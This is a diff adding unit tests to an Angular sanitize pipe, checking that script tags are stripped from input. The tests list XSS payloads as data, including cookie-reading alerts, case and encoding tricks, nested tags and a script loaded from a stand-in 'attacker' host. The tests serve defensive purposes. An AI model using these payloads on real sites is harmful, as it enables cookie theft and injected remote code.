@@ -38,4 +38,82 @@ describe('SanitizePipe', () => {
 
     expect(STRINGIFIED_RESULT).toEqual(EXPECTED);
   });
+
+  // TEST3: pipe should strip a <script> tag
+  it(`${TITLE} 3 > should strip a <script> tag`, () => {
+    const TEXT = `<script>alert('xss');</script>`;
+    const EXPECTED = '';
+    const RESULT = pipe.transform(TEXT);
+    const STRINGIFIED_RESULT = RESULT.toString()
+      .replace('SafeValue must use [property]=binding: ', '')
+      .replace('(see https://g.co/ng/security#xss)', '')
+      .trim();
+
+    expect(STRINGIFIED_RESULT).toEqual(EXPECTED);
+  });
+
+  // TEST4: pipe should strip <script> tags with bad syntax
+  it(`${TITLE} 4 > should strip <script> tags with bad syntax`, () => {
+    const TESTS = [
+      { test: '<script>', result: '' },
+      { test: '<script>alert("xss");</script>', result: '' },
+      { test: '<script >alert(document.cookie)</script >', result: '' },
+      { test: '"><ScRiPt>alert(document.cookie)</ScRiPt>', result: '">' },
+      { test: '"%3cscript%3ealert(document.cookie)%3c/script%3e', result: '"' },
+      {
+        test: '<scr<script>ipt>alert(document.cookie)</script>',
+        result: '<scr',
+      },
+      {
+        test: '< sc<scr<script>ipt>riPt >alert(document.cookie)</script>',
+        result: '< sc<scr',
+      },
+      {
+        test: 'http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>',
+        result: 'http://example/?var=',
+      },
+      {
+        test: 'http://example/page.php?param=<script&param=>[...]</&param=script>',
+        result: 'http://example/page.php?param=',
+      },
+      {
+        test: `<script type="text/javascript">var test1 = "</script>";var test2 = '\'</script>';var test1 = "\"</script>";var test1 = "<script>\"";var test2 = '<scr\'ipt>';/* </script> */// </script>/* ' */// var foo=" '</script>`,
+        result: `";var test2 = ''';var test1 = """;var test1 = "`,
+      },
+      {
+        test: `<script type="text/javascript">var test1 = "</script>";</script>`,
+        result: `";`,
+      },
+      {
+        test: `<script type="text/javascript">var test2 = '\'</script>';</script>`,
+        result: `';`,
+      },
+      {
+        test: `<script type="text/javascript">var test3 = "\"</script>";</script>`,
+        result: `";`,
+      },
+      {
+        test: `<script type="text/javascript">var test4 = "<script>\"";</script>`,
+        result: ``,
+      },
+      {
+        test: `<script type="text/javascript">var test5 = '<scr\'ipt>';</script>`,
+        result: ``,
+      },
+    ];
+
+    for (let test of TESTS) {
+      const RESULT = pipe.transform(test.test);
+      const STRINGIFIED_RESULT = RESULT.toString()
+        .replace('SafeValue must use [property]=binding: ', '')
+        .replace('(see https://g.co/ng/security#xss)', '')
+        .trim();
+      console.log(
+        `${test.test} >>> "${STRINGIFIED_RESULT}" =?= "${test.result}" >>> ${
+          STRINGIFIED_RESULT === test.result
+        }`
+      );
+      expect(STRINGIFIED_RESULT).toEqual(test.result);
+    }
+  });
 });
